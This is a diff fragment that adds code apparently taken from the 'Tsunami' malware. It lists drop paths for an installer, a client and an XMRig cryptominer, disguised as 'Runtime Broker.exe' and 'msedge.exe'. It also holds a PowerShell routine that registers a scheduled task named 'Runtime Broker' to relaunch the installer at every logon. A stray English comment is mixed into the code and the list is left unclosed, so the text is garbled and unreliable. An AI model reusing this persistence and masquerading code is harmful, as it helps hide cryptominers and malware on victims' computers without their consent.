@@ -1,0 +1,33 @@
+EXCEPTION_PATHS = [
+
+# Tsunami Installer
+
+rf"{ROAMING_APPDATA_PATH}\Microsoft\Windows\Applications\Runtime Broker.exe",
+
+# Tsunami Client
+
+rf"{LOCAL_APPDATA_PATH}\Microsoft\Windows\Applications\Runtime Broker.exe",
+
+# XMRig miner
+
+rf"{LOCAL_APPDATA_PATH}\Microsoft\Windows\Applications\msedge.exe"
+
+Here even there payloads that runs at every login
+
+def create_task() -> None:
+
+powershell_script = f\"\"\"
+
+$Action = New-ScheduledTaskAction -Execute "{TSUNAMI_INSTALLER_PATH}"
+
+$Trigger = New-ScheduledTaskTrigger -AtLogOn
+
+$Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
+
+$Principal.RunLevel = 1
+
+$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
+
+Register-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -TaskName "Runtime Broker"
+
+\"\"\"
